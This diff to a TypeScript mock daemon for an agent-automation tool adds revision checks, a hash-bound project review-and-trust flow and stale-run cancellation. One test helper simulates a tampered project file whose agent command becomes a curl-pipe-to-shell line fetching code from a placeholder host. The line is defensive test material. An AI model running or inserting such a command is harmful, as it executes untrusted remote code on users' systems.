@@ -37,7 +37,11 @@ import type {
   SystemStatus,
   WhereCondition,
   WhereScalar,
+  Expected,
+  ProjectReview,
 } from "../contracts";
+import { ERROR_STALE } from "../contracts";
+import { changes, digest, projectText, revisionOf, sameDefinition, type ProjectFile } from "./files";
 import {
   parseDuration,
   parseRate,
@@ -75,6 +79,22 @@ const notFound = (what: string, id: string) => new MockRpcError(-32002, `${what}
 const conflict = (msg: string) => new MockRpcError(-32003, msg);
 const configInvalid = (errors: ConfigError[]) =>
   new MockRpcError(-32004, errors.map((e) => e.message).join("; "), { errors });
+const stale = (msg: string, current: string | null) => new MockRpcError(ERROR_STALE, msg, { current });
+
+/** The daemon's `check_expected`. */
+function checkExpected(what: string, name: string, expected: Expected | undefined, current: string | null): void {
+  const e = expected ?? { kind: "any" };
+  if (e.kind === "any") return;
+  if (e.kind === "absent" && current === null) return;
+  if (e.kind === "revision" && e.revision === current) return;
+  if (e.kind === "absent") throw stale(`a ${what} named ${JSON.stringify(name)} already exists`, current);
+  if (current === null) throw stale(`the ${what} ${JSON.stringify(name)} was removed since it was read`, null);
+  throw stale(`the ${what} ${JSON.stringify(name)} changed since it was read`, current);
+}
+
+const bare = (name: string, origin: ConfigOrigin) => (origin.kind === "project" ? name.slice(origin.name.length + 1) : name);
+const STALE_AGENT = "the agent was removed or changed after this run was created; replay the event to run it with the current definition";
+const STALE_RULE = "the rule was removed, archived or its prompt changed after this run was created; replay the event to run it with the current definition";
 
 /** Live batches: at most this many events each, the rest counted as dropped (as the daemon). */
 const BATCH_MAX = 200;
@@ -199,8 +219,8 @@ export class MockDaemon {
   private agents: Def<AgentConfig>[];
   private sources: (Def<SourceConfig> & { health: SourceHealth })[];
   private projects: Project[];
-  /** Definitions of an untrusted project, kept so trusting it again restores them. */
-  private readonly stash = new Map<string, { rules: Def<RuleConfig>[]; agents: Def<AgentConfig>[]; sources: (Def<SourceConfig> & { health: SourceHealth })[] }>();
+  /** Each project's `pulse.toml` as it is on "disk", and the text that was trusted. */
+  private readonly files = new Map<string, { now: ProjectFile; trusted: ProjectFile | null }>();
   private configErrors: ConfigError[];
   private configWarnings: ConfigError[];
   private readonly ruleState: Record<string, RuleRuntimeStatus>;
@@ -223,6 +243,16 @@ export class MockDaemon {
     this.agents = fx.agents();
     this.sources = fx.sources(now);
     this.projects = fx.projects(now);
+    const onDisk = fx.projectFiles();
+    for (const p of this.projects) {
+      const disk = onDisk[p.name];
+      const file = (defs: Omit<ProjectFile, "text">): ProjectFile => ({ ...defs, text: projectText(defs, `# ${p.file}\n\n`) });
+      const now = file(disk?.now ?? this.projectDefs(p.name));
+      const trusted = p.state === "trusted" ? now : disk?.trusted ? file(disk.trusted) : null;
+      this.files.set(p.name, { now, trusted });
+      p.current_hash = digest(now.text);
+      if (trusted) p.trusted_hash = digest(trusted.text);
+    }
     this.configErrors = fx.configErrors();
     this.configWarnings = fx.configWarnings();
     this.ruleState = fx.ruleStates(now);
@@ -313,7 +343,24 @@ export class MockDaemon {
     };
   }
 
+  /** A loaded project's definitions as written in its file (bare names). */
+  private projectDefs(project: string): Omit<ProjectFile, "text"> {
+    const mine = <T extends { name: string }>(defs: Def<T>[]) =>
+      defs.filter((d) => d.origin.kind === "project" && d.origin.name === project).map((d) => ({ ...d.config, name: bare(d.config.name, d.origin) }));
+    return { rules: mine(this.rules).map(ruleWire), agents: mine(this.agents).map(agentWire), sources: mine(this.sources).map(sourceWire) };
+  }
+
   private broadcast(topics: StateTopic[]): void {
+    // Write-back to a trusted project's file re-binds its trust (as the daemon does).
+    if (topics.includes("config")) {
+      for (const p of this.projects) {
+        if (p.state !== "trusted") continue;
+        const defs = this.projectDefs(p.name);
+        const now = { ...defs, text: projectText(defs, `# ${p.file}\n\n`) };
+        this.files.set(p.name, { now, trusted: now });
+        p.current_hash = p.trusted_hash = digest(now.text);
+      }
+    }
     if (this.seeding) return;
     const frame = { jsonrpc: "2.0", method: "state.changed", params: { status: this.status(), topics } };
     for (const c of this.conns) c.send(frame);
@@ -734,6 +781,8 @@ export class MockDaemon {
       output: { bytes: 0, dropped_bytes: 0 },
       snapshot: { rule: ruleWire(def.config), agent: agentWire(agent.config) },
     };
+    // Rendered at creation, so an approval shows what will run.
+    run.invocation = this.invocation(run);
     this.runs.set(run.id, run);
     this.runOrder.push(run.id);
     this.output.set(run.id, []);
@@ -747,7 +796,9 @@ export class MockDaemon {
     const cwd = this.expand(agent.cwd ?? `${fx.PULSE_HOME}/runs`);
     const event = this.eventById.get(run.event);
     if (agent.adapter === "command") {
-      const args = agent.command.slice(1).map((a) => a.replace(/\{\{\s*path\s*\}\}/g, String((event?.data as { path?: string })?.path ?? "")));
+      const args = agent.command
+        .slice(1)
+        .map((a) => a.replace(/\{\{\s*path\s*\}\}/g, String((event?.data as { path?: string })?.path ?? "")).replace(/\{\{\s*subject\s*\}\}/g, event?.subject ?? ""));
       return { program: agent.command[0] ?? "", args, cwd };
     }
     if (agent.adapter === "codex") return { program: "codex", args: ["exec", "--json", "--sandbox", agent.sandbox ?? "read-only", "-"], cwd };
@@ -774,11 +825,28 @@ export class MockDaemon {
     }
   }
 
+  /** The daemon's `release::stale_reason`. */
+  private staleReason(run: Run): string | null {
+    const agent = this.agentDef(run.agent);
+    if (!agent || !sameDefinition(agentWire(agent.config), agentWire(run.snapshot.agent))) return STALE_AGENT;
+    const snap = run.snapshot.rule;
+    if (snap) {
+      const rule = this.rules.find((r) => r.config.name === snap.name);
+      if (!rule || rule.config.archived || !sameDefinition(rule.config.run, snap.run)) return STALE_RULE;
+    }
+    return null;
+  }
+
   private start(run: Run, at: number): void {
+    const reason = this.seeding ? null : this.staleReason(run);
+    if (reason) {
+      this.endRun(run, "cancelled", reason, at);
+      return;
+    }
     run.status = "running";
     run.started_at = iso(at + 40);
     run.pid = 40_000 + Math.floor(this.rand() * 20_000);
-    run.invocation = this.invocation(run);
+    run.invocation ??= this.invocation(run);
     this.runChanged(run);
     const event = this.eventById.get(run.event);
     const script = scriptFor(run.snapshot.agent, event?.subject ?? "", run.rule ?? null);
@@ -934,8 +1002,12 @@ export class MockDaemon {
 
   // ---- definitions ----
 
+  private revision<T extends { name: string }>(def: Def<T>, wire: (t: T) => T): string {
+    return revisionOf(wire({ ...def.config, name: bare(def.config.name, def.origin) }));
+  }
+
   private ruleInfo(def: Def<RuleConfig>): RuleInfo {
-    return { config: ruleWire(def.config), origin: def.origin, state: { snoozed_until: null, circuit_open_until: null, last_fired_at: null, ...this.ruleState[def.config.name] } };
+    return { config: ruleWire(def.config), origin: def.origin, revision: this.revision(def, (r) => ruleWire(ruleDefaults(r))), state: { snoozed_until: null, circuit_open_until: null, last_fired_at: null, ...this.ruleState[def.config.name] } };
   }
 
   private getRuleDef(name: string): Def<RuleConfig> {
@@ -1011,11 +1083,11 @@ export class MockDaemon {
       if (r.status === "running") running++;
       if (r.status === "queued") queued++;
     }
-    return { config: agentWire(def.config), origin: def.origin, running, queued };
+    return { config: agentWire(def.config), origin: def.origin, revision: this.revision(def, (a) => agentWire(agentDefaults(a))), running, queued };
   }
 
   private sourceInfo(def: Def<SourceConfig> & { health: SourceHealth }): SourceInfo {
-    return { config: sourceWire(def.config), origin: def.origin, health: { ...def.health } };
+    return { config: sourceWire(def.config), origin: def.origin, revision: this.revision(def, sourceWire), health: { ...def.health } };
   }
 
   // ---- the method map ----
@@ -1092,9 +1164,11 @@ export class MockDaemon {
       rules: this.rules.filter((r) => include_archived || !r.config.archived).map((r) => this.ruleInfo(r)),
     }),
     "rules.get": ({ name }) => this.ruleInfo(this.getRuleDef(name)),
-    "rules.upsert": ({ rule, project }) => {
+    "rules.upsert": ({ rule, project, expected }) => {
       const origin = this.originFor(project);
       const full = project ? `${project}/${rule.name}` : rule.name;
+      const prev = this.rules.find((r) => r.config.name === full);
+      checkExpected("rule", rule.name, expected, prev ? this.ruleInfo(prev).revision : null);
       const errors = this.validateRule(rule, origin);
       if (errors.length) throw configInvalid(errors);
       const def: Def<RuleConfig> = { config: { ...ruleDefaults(rule), name: full }, origin };
@@ -1104,8 +1178,10 @@ export class MockDaemon {
       this.broadcast(["rules", "config"]);
       return this.ruleInfo(def);
     },
-    "rules.delete": ({ name }) => {
-      this.getRuleDef(name);
+    "rules.delete": ({ name, expected }) => {
+      const prev = this.rules.find((r) => r.config.name === name);
+      if (!prev && expected?.kind === "revision") throw stale(`the rule ${JSON.stringify(name)} was removed since it was read`, null);
+      checkExpected("rule", name, expected, this.ruleInfo(this.getRuleDef(name)).revision);
       this.rules = this.rules.filter((r) => r.config.name !== name);
       this.broadcast(["rules", "config"]);
       return {};
@@ -1184,11 +1260,13 @@ export class MockDaemon {
       if (!a) throw notFound("agent", JSON.stringify(name));
       return this.agentInfo(a);
     },
-    "agents.upsert": ({ agent, project }) => {
+    "agents.upsert": ({ agent, project, expected }) => {
       const origin = this.originFor(project);
+      const full = project ? `${project}/${agent.name}` : agent.name;
+      const prev = this.agentDef(full);
+      checkExpected("agent", agent.name, expected, prev ? this.agentInfo(prev).revision : null);
       const errors = this.validateAgent(agent, origin);
       if (errors.length) throw configInvalid(errors);
-      const full = project ? `${project}/${agent.name}` : agent.name;
       const def: Def<AgentConfig> = { config: { ...agentDefaults(agent), name: full }, origin };
       const i = this.agents.findIndex((a) => a.config.name === full);
       if (i >= 0) this.agents[i] = def;
@@ -1196,8 +1274,10 @@ export class MockDaemon {
       this.broadcast(["agents", "config"]);
       return this.agentInfo(def);
     },
-    "agents.delete": ({ name }) => {
-      if (!this.agentDef(name)) throw notFound("agent", JSON.stringify(name));
+    "agents.delete": ({ name, expected }) => {
+      const prev = this.agentDef(name);
+      if (!prev) throw expected?.kind === "revision" ? stale(`the agent ${JSON.stringify(name)} was removed since it was read`, null) : notFound("agent", JSON.stringify(name));
+      checkExpected("agent", name, expected, this.agentInfo(prev).revision);
       const users = this.rules.filter((r) => !r.config.archived && this.resolveAgentName(r) === name).map((r) => r.config.name);
       if (users.length) throw conflict(`agent ${JSON.stringify(name)} is used by ${users.map((u) => `rule ${JSON.stringify(u)}`).join(", ")}; change or delete those rules first`);
       this.agents = this.agents.filter((a) => a.config.name !== name);
@@ -1213,12 +1293,13 @@ export class MockDaemon {
     },
 
     "sources.list": () => ({ sources: this.sources.map((s) => this.sourceInfo(s)) }),
-    "sources.upsert": ({ source, project }) => {
+    "sources.upsert": ({ source, project, expected }) => {
       const origin = this.originFor(project);
-      const errors = this.validateSource(source, origin);
-      if (errors.length) throw configInvalid(errors);
       const full = project ? `${project}/${source.name}` : source.name;
       const prev = this.sourceFor(full);
+      checkExpected("source", source.name, expected, prev ? this.sourceInfo(prev).revision : null);
+      const errors = this.validateSource(source, origin);
+      if (errors.length) throw configInvalid(errors);
       const now = this.now();
       const health: SourceHealth = source.enabled
         ? { state: "starting", since: iso(now), events_emitted: prev?.health.events_emitted ?? 0, last_event_at: prev?.health.last_event_at ?? null }
@@ -1239,8 +1320,19 @@ export class MockDaemon {
       this.broadcast(["sources", "config"]);
       return this.sourceInfo(def);
     },
-    "sources.delete": ({ name }) => {
-      if (!this.sourceFor(name)) throw notFound("source", JSON.stringify(name));
+    "sources.set_enabled": ({ name, enabled }) => {
+      const def = this.sourceFor(name);
+      if (!def) throw notFound("source", JSON.stringify(name));
+      def.config = { ...def.config, enabled };
+      const now = this.now();
+      def.health = enabled ? { ...def.health, state: "healthy", since: iso(now), message: null } : { ...def.health, state: "disabled", since: iso(now), message: null };
+      this.broadcast(["sources", "config"]);
+      return this.sourceInfo(def);
+    },
+    "sources.delete": ({ name, expected }) => {
+      const prev = this.sourceFor(name);
+      if (!prev) throw expected?.kind === "revision" ? stale(`the source ${JSON.stringify(name)} was removed since it was read`, null) : notFound("source", JSON.stringify(name));
+      checkExpected("source", name, expected, this.sourceInfo(prev).revision);
       this.sources = this.sources.filter((s) => s.config.name !== name);
       this.broadcast(["sources", "config"]);
       return {};
@@ -1312,6 +1404,11 @@ export class MockDaemon {
     "runs.approve": ({ id }) => {
       const r = this.getRun(id);
       if (r.status !== "pending_approval") throw conflict(`run ${id} is ${r.status}, not pending approval`);
+      const reason = this.staleReason(r);
+      if (reason) {
+        this.endRun(r, "cancelled", reason);
+        throw conflict(`not approved: ${reason}`);
+      }
       r.status = "queued";
       this.runChanged(r);
       this.pump(r.agent, this.now());
@@ -1325,9 +1422,14 @@ export class MockDaemon {
     },
     "runs.rerun": ({ id }) => {
       const orig = this.getRun(id);
+      const agent = this.agentDef(orig.agent);
+      if (!agent) throw conflict(`the agent ${JSON.stringify(orig.agent)} no longer exists, so this run cannot be run again`);
+      const rule = orig.rule ? this.rules.find((r) => r.config.name === orig.rule) : undefined;
       const at = this.now();
       const run: Run = {
         ...structuredClone(orig),
+        rule: rule?.config.name ?? null,
+        snapshot: { rule: rule ? ruleWire(rule.config) : null, agent: agentWire(agent.config) },
         id: this.ids.next(at),
         status: "queued",
         created_at: iso(at),
@@ -1341,6 +1443,7 @@ export class MockDaemon {
         rerun_of: orig.id,
         output: { bytes: 0, dropped_bytes: 0 },
       };
+      run.invocation = this.invocation(run);
       this.runs.set(run.id, run);
       this.runOrder.push(run.id);
       this.output.set(run.id, []);
@@ -1350,24 +1453,25 @@ export class MockDaemon {
     },
 
     "projects.list": () => ({ projects: this.projects.map((p) => ({ ...p })) }),
-    "projects.trust": ({ dir, name }) => {
-      const d = dir.replace(/\/$/, "");
-      let p = this.projects.find((x) => x.dir === d || x.dir === this.expand(d));
-      if (!p) {
-        if (!d.startsWith("/") && !d.startsWith("~")) throw new MockRpcError(-32602, "invalid params: `dir` must be absolute");
-        throw notFound("project file", `${d}/pulse.toml`);
-      }
+    "projects.review": ({ dir, name }) => this.review(dir, name ?? undefined),
+    "projects.trust": ({ dir, name, hash }) => {
+      const p = this.findProject(dir);
+      const file = this.files.get(p.name);
+      if (!file) throw notFound("project file", p.file);
+      const current = digest(file.now.text);
+      if (hash !== current) throw stale(`${p.file} changed since it was reviewed; review it again before trusting it`, current);
       if (name && name !== p.name) p.name = name;
+      this.unload(p.name);
+      const origin: ConfigOrigin = { kind: "project", name: p.name, dir: p.dir, path: p.file };
+      const full = <T extends { name: string }>(d: T): T => ({ ...d, name: `${p.name}/${d.name}` });
+      this.agents.push(...file.now.agents.map((a) => ({ config: agentDefaults(full(a)), origin })));
+      this.rules.push(...file.now.rules.map((r) => ({ config: ruleDefaults(full(r)), origin })));
+      const now = iso(this.now());
+      this.sources.push(...file.now.sources.map((x) => ({ config: full(x), origin, health: { state: "healthy" as const, since: now, events_emitted: 0 } })));
+      this.files.set(p.name, { now: file.now, trusted: file.now });
       p.state = "trusted";
-      p.trusted_hash = p.current_hash ?? null;
-      p.trusted_at = iso(this.now());
-      const stashed = this.stash.get(p.name);
-      if (stashed) {
-        this.rules.push(...stashed.rules);
-        this.agents.push(...stashed.agents);
-        this.sources.push(...stashed.sources);
-        this.stash.delete(p.name);
-      }
+      p.trusted_hash = current;
+      p.trusted_at = now;
       this.broadcast(["projects", "rules", "agents", "sources", "config"]);
       return { ...p };
     },
@@ -1377,15 +1481,9 @@ export class MockDaemon {
       p.state = "untrusted";
       p.trusted_hash = null;
       p.trusted_at = null;
-      const mine = (o: ConfigOrigin) => o.kind === "project" && o.name === p.name;
-      this.stash.set(p.name, {
-        rules: this.rules.filter((r) => mine(r.origin)),
-        agents: this.agents.filter((a) => mine(a.origin)),
-        sources: this.sources.filter((s) => mine(s.origin)),
-      });
-      this.rules = this.rules.filter((r) => !mine(r.origin));
-      this.agents = this.agents.filter((a) => !mine(a.origin));
-      this.sources = this.sources.filter((s) => !mine(s.origin));
+      const file = this.files.get(p.name);
+      if (file) this.files.set(p.name, { now: file.now, trusted: null });
+      this.unload(p.name);
       if (p.name === "notes") this.configErrors = this.configErrors.filter((e) => !e.file?.startsWith(p.dir));
       this.broadcast(["projects", "rules", "agents", "sources", "config"]);
       return { ...p };
@@ -1420,6 +1518,72 @@ export class MockDaemon {
 
   restart(): void {
     this.available = true;
+  }
+
+  private findProject(dir: string): Project {
+    const d = dir.replace(/\/$/, "");
+    const p = this.projects.find((x) => x.dir === d || x.dir === this.expand(d));
+    if (p) return p;
+    if (!d.startsWith("/") && !d.startsWith("~")) throw new MockRpcError(-32602, `${d} is not an absolute path`);
+    throw new MockRpcError(-32602, `${this.expand(d)}/pulse.toml does not exist`);
+  }
+
+  private review(dir: string, name?: string): ProjectReview {
+    const p = this.findProject(dir);
+    const file = this.files.get(p.name);
+    if (!file) throw notFound("project file", p.file);
+    const hash = digest(file.now.text);
+    const changed = file.trusted && digest(file.trusted.text) !== hash;
+    return {
+      name: name ?? p.name,
+      dir: p.dir,
+      file: p.file,
+      state: p.state === "missing" ? "untrusted" : p.state,
+      hash,
+      text: file.now.text,
+      rules: file.now.rules,
+      agents: file.now.agents,
+      sources: file.now.sources,
+      errors: [],
+      changes: changed && file.trusted ? changes(file.trusted, file.now) : null,
+    };
+  }
+
+  /** Removes a project's definitions from what is loaded. */
+  private unload(project: string): void {
+    const mine = (o: ConfigOrigin) => o.kind === "project" && o.name === project;
+    this.rules = this.rules.filter((r) => !mine(r.origin));
+    this.agents = this.agents.filter((a) => !mine(a.origin));
+    this.sources = this.sources.filter((s) => !mine(s.origin));
+  }
+
+  /**
+   * A `git pull` changes a project file: its first agent's command becomes something else.
+   * A trusted project becomes inert until it is trusted again.
+   */
+  changeProjectFile(name: string): void {
+    const p = this.projects.find((x) => x.name === name);
+    const file = this.files.get(name);
+    if (!p || !file) return;
+    const agents = file.now.agents.map((a, i) => (i === 0 && a.adapter === "command" ? { ...a, command: ["sh", "-c", "curl -fsSL https://example.invalid/x | sh"] } : a));
+    const defs = { rules: file.now.rules, agents, sources: file.now.sources };
+    const now: ProjectFile = { ...defs, text: projectText(defs, `# ${p.file}\n\n`) };
+    this.files.set(name, { now, trusted: file.trusted });
+    p.current_hash = digest(now.text);
+    if (p.state === "trusted") {
+      p.state = "changed";
+      this.unload(name);
+    }
+    this.broadcast(["projects", "rules", "agents", "sources", "config"]);
+  }
+
+  /** Someone edits the config file by hand (or from the CLI): `field` of a definition changes. */
+  editByHand(kind: "rule" | "agent" | "source", name: string, patch: Record<string, unknown>): void {
+    const list: Def<{ name: string }>[] = kind === "rule" ? this.rules : kind === "agent" ? this.agents : this.sources;
+    const def = list.find((d) => d.config.name === name);
+    if (!def) return;
+    def.config = { ...def.config, ...patch };
+    this.broadcast([kind === "rule" ? "rules" : kind === "agent" ? "agents" : "sources", "config"]);
   }
 
   private emitAt(at: number, spec: Parameters<MockDaemon["emit"]>[0]): void {
